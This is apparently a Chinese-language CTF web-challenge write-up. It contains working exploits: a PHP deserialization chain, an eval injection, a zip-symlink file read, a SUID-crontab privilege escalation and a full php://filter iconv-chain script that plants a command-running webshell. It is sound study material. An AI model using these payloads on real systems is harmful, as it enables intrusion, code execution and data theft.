# Week 1
# Please wake me up

发送后控制台返回`ezezpop.php`的`base64`

`Ori.php`

```php
<?php
#flag在/flag中
highlight_file(__FILE__);
error_reporting(1);
$wakeup='asleep';
class phone{
    public $a;
    public function test(){
        global $wakeup;
        if($wakeup!='wakeup'){
            echo('I am sleeping');
        }
        if(!preg_match("/[a-z0-9]+/i", $this->a)){
            eval($this->a);
        }else{
            echo("I am sleeping");
        }
    }
}

class please{
    public $a;
    public function __wakeup(){
        ($this->a)();
    }
    public function __destruct(){
        echo('I am sleeping');
    }
}
class wake{
    public function __call($hs,$cs){
        ($cs[0])[strlen($hs)]();
    }
}
class up{
    public $a;
    public $b;
    public $c;
    public function __call($hs,$cs){
        global $wakeup;
        $this->a=mt_rand();
        if($this->b==$this->a){
            $wakeup=$cs[strlen($hs)-$this->c];
        }
    }
}
class me{
    public $a;
    public $b;
    public $c;
    public $d;
    public function __invoke(){
        $this->a->oh($this->c);
        
    }
    public function __wakeup(){
        $this->b->ho($this->d);
    }
    
}

unserialize($_POST['mobile']);
?> 

```
本题使用 [class, method] 存储函数，进而可以调用

注意用 `HackerBar` 提交的话改为 `application/x-www-form-urlencoded (raw)`

`exp.php`
```php
<?php
class phone
{
    public $a;
    public function test() {}
}

class please
{
    public $a;
    public function __construct() {
        $phone = new phone();
        $phone->a = "\$_=~\"" . ~'system' . "\";" . "\$_(~\"" . ~'cat /flag' . "\");";
        $this->a = [$phone, 'test']; // $phone->test 赋值给 $this->a
    }
}

echo urlencode(serialize(new please()));
```

## play a game

`/check.php?score=114514`

`Ori.php`

```php
<?php
$func = $_GET['func'];
$arg = $_GET['arg'];
if($func != $arg || md5($func) == md5($arg)) {  // 弱相等 (CAO, 没看到是或，还以为考的md5
    eval($func . $arg);     // 注意 . 运算是字符串拼接
}
```

没看到是或(||)。。。

`exp`
```Plain
/?score=114514&func=system('cat &arg=/flag');
```

## 粉毛的专辑店

环境好像炸了（看题解应该是`SSTI`），不过这个认证还真没做过

# Week 2

## file_manager

zip软链接

```bash
sudo ln -s /flag.txt fff
sudo zip --symlink fff.zip fff
```

上传`fff.zip`即可

## Take notes

点击“公开”抓到以下包（修改post内容）
```http request
POST /admin.php?token=0192023a7bbd73250516f069df18b500&path=.%252Fnotes/test HTTP/1.1
Host: 127.0.0.1:44967
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=e2c182040ad6aa7048ab7a29973871fa

filename=a.php&content=<?php echo base64_encode((file_get_contents('../admin.php')));?>&currentPath=./notes/test
```

`admin.php`（能拿到的时候就没有什么用了）

```php
<?php
// 模拟管理员鉴权
if ($_GET['token'] !== md5('admin123')) {
    die('Access Denied!');
}

$rootDir = './notes'; // 设置根目录

// 安全地获取当前路径<script>alert('1')</script>
$currentPath = isset($_GET['path']) ? urldecode($_GET['path']) : $rootDir;
if (!function_exists('str_starts_wit')) {
    function str_starts_with($haystack, $needle) {
        return (string)$needle !== '' && strncmp((string)$haystack, (string)$needle, strlen((string)$needle)) === 0;
    }
}
if (!str_starts_wit(realpath($currentPath), realpath($rootDir))) { // 防止目录遍历攻击
    die('<h1>Invalid path: <br>'.$currentPath.'<br>不是:<br>'.realpath($rootDir).'下的文件夹</h1>');
}elseif(!(file_exists($currentPath) || is_dir($currentPath))) {
    die("路径不存在或不是目录");
}


function listDirContents($dir) {
    $result = ['files' => [], 'dirs' => []];
    foreach (scandir($dir) as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = "$dir/$item";
        if (is_dir($fullPath)) {
            $result['dirs'][] = $item;
        } else {
            $result['files'][] = $item;
        }
    }
    return $result;
}

$contents = listDirContents($currentPath);
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // 获取POST数据并进行必要的清理
    $filename0 = isset($_POST['filename']) ? trim($_POST['filename']) : '';
    $content0 = isset($_POST['content']) ? trim($_POST['content']) : '';
    $currentPath0= isset($_POST['currentPath']) ? trim($_POST['currentPath']) : '';
    
    
    $content0 = preg_replace('/eval|assert|system|exec|shell_exec|getenv|passthru/i', '危险函数', $content0);
    $content0 = preg_replace('/\$/', '￥', $content0);
    $content0 = preg_replace('/cat|ls|whoami/i', '危险操作', $content0);
    file_put_contents("{$currentPath0}/../{$filename0}", $content0);
    

}
// 查看具体笔记
if (isset($_GET['view'])) {
    $filename = basename($_GET['view']);
    $content = htmlspecialchars(file_get_contents("$currentPath/$filename"), ENT_QUOTES);
    
    echo "<h3>$filename 的内容：</h3>";
    echo '<div class="note-content">'.$content.'</div>';
    echo "<form method='post'>
            <input name='filename' type='hidden' value='$filename'>
            <input name='content' type='hidden' value='$content'>
            <input name='currentPath' type='hidden' value='$currentPath'>
            <button>公开笔记</button>
        </form>";
    exit();
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>🔒 NoteHub - 查看面板</title>
    <style>
        .note-list, .dir-list { cursor: pointer; color: blue; margin: 5px 0; }
        .note-list:hover, .dir-list:hover { text-decoration: underline; }
        .go-up { cursor: pointer; color: green; margin: 5px 0; } /* 新增样式 */
        .go-up:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📂 当前目录：<?=htmlspecialchars(basename($currentPath))?></h1>
        <?php if (realpath($currentPath) !== realpath($rootDir)): ?>
            <div class="go-up" onclick="navigateUp()">返回上级目录</div>
        <?php endif; ?>
        <?php foreach($contents['dirs'] as $dir): ?>
            <div class="dir-list" onclick="navigateToDir('<?=urlencode($dir)?>')">
                📁 <?=htmlspecialchars($dir)?>
            </div>
        <?php endforeach; ?>

        <?php foreach($contents['files'] as $file): ?>
            <div class="note-list" onclick="viewNote('<?=urlencode($file)?>')">
                📄 <?=htmlspecialchars(basename($file, '.txt'))?>
            </div>
        <?php endforeach; ?>
        
        <div id="note-display"></div>
    </div>

    <script>
        
        const token = encodeURIComponent('<?=$_GET['token']?>');
        const currentPath = '<?=urlencode($currentPath)?>';

        function navigateToDir(dirName) {
            let newPath = `${currentPath}/${dirName}`;
            window.location.href = `admin.php?token=${token}&path=${encodeURIComponent(newPath)}`;
        }

        function viewNote(filename) {
            fetch(`admin.php?token=${token}&path=${currentPath}&view=${filename}`)
                .then(r => r.text())
                .then(html => {
                    document.getElementById('note-display').innerHTML = html;
                });
        }
        function navigateUp() {
            let parts = currentPath.split('%2F');
            
            parts.pop(); // 移除最后一个部分，即当前目录名
            
            let newPath = parts.join('%2F');
            
            window.location.href = `admin.php?token=${token}&path=${encodeURIComponent(newPath)}`;
        }
    </script>
</body>
</html>
```

接下来是命令（禁用`cat`、`ls`、`whoami`）绕过 和 提权

- 绕过

1. `tac` `base64`       # 用于绕过禁用的 `cat` 命令，读取文件内容并输出
2. `find / -name "*"`   # 使用`find`命令递归查找所有文件，代替`ls`命令来遍历整个文件系统
3. `stat`               # 用于查看文件的详细信息，包括权限、所有者等，用来获取文件属性
4. `id`                 # 用于显示当前用户的`UID`和`GID`信息，确认当前权限级别

- 提权

`find / -perm -4000` # 查找`SUID`提权命令

本题回显`/usr/bin/crontab`

> `crontab` 是一个用于设置周期性执行任务的命令。在CTF题目中，如果发现`/usr/bin/crontab`具有SUID权限（即回显的路径具有特殊权限），这意味着可以利用它来提权。
> 拥有SUID权限的`crontab`允许普通用户以root权限创建定时任务，从而可能执行任意命令或获取flag。

然后通过查找任务文件 `/etc/crontabs/root`

```bash
* * * * * /usr/local/src/tmp/cron_job07.sh  # <-- 这一行表示 每分钟都会以 root 身份执行一次 /usr/local/src/tmp/cron_job07.sh 脚本
* * * * * echo $(date) > /var/www/html/notes/public
0 5 1 * * run-parts /etc/periodic/monthly
0 3 * * 6 run-parts /etc/periodic/weekly
0 2 * * * run-parts /etc/periodic/daily
0 * * * * run-parts /etc/periodic/hourly
*/15 * * * * run-parts /etc/periodic/15min

# min hour day month weekday command  
# do daily/weekly/monthly maintenance
```

那我们直接
```bash
echo "tac /flag > /var/www/html/notes/f" > /usr/local/src/tmp/cron_job07.sh
# 或者
echo "chmod 777 /flag" > /usr/local/src/tmp/cron_job07.sh
```

# Week 3

## waziplink

[Official Answer(Click Me)](https://ctf.xidian.edu.cn/training/17?challenge=751&tab=answer)

`official_exp.js`

```javascript
#!/usr/bin/env -S bun run
// Install JSZip by `bun install jszip` or with other package mananger.
import JSZip from 'jszip';
// The target URL of the challenge, without trailing slash
const TARGET_URI = "http://175.27.249.18:30132"
// The regex to match the flag
const FLAG_REGEX = /flag{.+}/

function createSymlinkZipBlob(pid, fd) {
    const zip = new JSZip();
    zip.file('flag.ts', `/proc/${pid}/fd/${fd}`, {
        unixPermissions: 0o755 | 0o120000, // symlink
    })
    zip.file('entry.ts', "import './flag.ts';\n")
    return zip.generateAsync({ type: 'blob', platform: 'UNIX' })
}

// Collect information
console.log('Fetching status')
let json = await fetch(`${TARGET_URI}/status`).then(r => r.json())
const pid = json.pid
console.log(`[+] PID: ${pid}`)

// Leak
for (let fd = 10; fd <= 20; ++fd) {
    // Create zip
    console.log(`\nCreating zip -> /proc/${pid}/fd/${fd}`)
    const formdata = new FormData()
    const zipBlob = await createSymlinkZipBlob(pid, fd)
    formdata.append('file', zipBlob, 'leak.zip')
    formdata.append('entry', 'entry.ts');

    // Upload
    console.log('Uploading')
    json = await fetch(`${TARGET_URI}/api/upload`, {
        method: 'POST',
        body: formdata
    }).then(r => r.json())
    const uuid = json.data.id

    // Run Code
    console.log(`Running code #${uuid}`)
    json = await fetch(`${TARGET_URI}/api/run/${uuid}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }).then(r => r.json())

    // Test if the flag is leaked
    if (FLAG_REGEX.test(json.result.stderr)) {
        const flag = json.result.stderr.match(FLAG_REGEX)[0]
        console.log(`\n[+] Flag: ${flag}`)
        break
    }
}
```

# final
## 签个到吧
`Solve.php`
```php
<?php

$this->a = &$this->b
```
## not_ezphp
`Ori.php`
```php
<?php
# Try to read flag.php

if (isset($_POST['file'])){
  echo hash_file('md5', $_POST['file']);
}
```
`hash_file` 也能吃 `php://filter`，而且这里报错会直接回显在页面上，所以可以把 `Allowed memory size of` 当成 oracle，直接用 `php_filter_chains_oracle_exploit` 盲读 `flag.php`：

```bash
python filters_chain_oracle_exploit.py \
  --target http://127.0.0.1:54149/ \
  --file flag.php \
  --parameter file \
  --match "Allowed memory size of"
```

盲读出来的 `flag.php`：

```php
<?php

if (isset($_GET['0r4c111e'])) {
    highlight_file(__FILE__);
}

# Try to RCE

if (isset($_GET['cat']) && strlen($_GET['cat']) < 255) {
    $contents = file_get_contents($_GET['cat']);
    file_put_contents($_GET['cat'], $contents);
}
```

这里的关键点是：

1. `?0r4c111e=1` 可以直接高亮第二层源码。
2. `?cat=...` 会先 `file_get_contents` 再 `file_put_contents` 到同一个目标。
3. 配合 `php://filter/read=.../resource=...` 可以把一个空文件一步步变成 webshell。

先创建一个空文件：

```bash
curl "http://127.0.0.1:54149/flag.php?cat=php://filter/resource=shell.php"
```

然后分段刷 filter chain，把 `<?=\`$_POST[0]\`;?>` 写进去。这里直接复用官方的 exp 就行：

```python
#!/usr/bin/python3
import requests
import sys
import time
from base64 import b64encode

CMAP = {
    '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
    '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
    '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
    '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
    '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
    '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
    '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
    '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
    '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
    'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
    'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
    'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
    'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
    'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
    'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
    'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
    'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
    'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
    'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
    'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
    'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
    'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
    'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
    'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
    'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
    'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
    'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
    'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
    'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
    'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
    'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
    'M': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
    'm': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
    'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
    'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
    'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
    'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
    'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
    'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
    'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
    'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
    'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
    'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
    'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
    's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
    't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
    'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
    'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
    'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
    'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
    'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
    'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
    'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
    'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
    'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
    'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
    'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
    'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
    '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
    '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
    '=': ''
}

INIT_GARBAGE = "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7"
DECODE_FILTER = "convert.base64-decode"
RAW = "<?=`$_POST[0]`;?>"

def get_chains(base64_evil: str, decode_filter=''):
    chain = [INIT_GARBAGE]
    for c in base64_evil[::-1]:
        it = CMAP[c]
        if it:
            it += "|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7"
            chain.append(it)
    chain.append(decode_filter)
    return chain

def write_webshell(target: str, filename: str):
    base64_evil = b64encode(RAW.encode()).decode().replace("=", "")
    chains = get_chains(base64_evil, DECODE_FILTER)
    requests.get(f"{target}/flag.php?cat=php://filter/resource={filename}")
    for p in chains:
        requests.get(f"{target}/flag.php?cat=php://filter/read={p}/resource={filename}")

def rce(target: str, filename: str, cmd: str):
    tail = len(requests.post(f"{target}/{filename}", data={0: "echo -n"}).content)
    r = requests.post(f"{target}/{filename}", data={0: cmd})
    return r.content[:-tail].decode()

target = "http://127.0.0.1:54149"
filename = f"shell.{int(time.time())}.php"
write_webshell(target, filename)
print(rce(target, filename, "/readflag"))
```

运行后直接出 flag：

```Plain
flag{7833aa35-681a-9d3a-a251-e28a075b1dff}
```
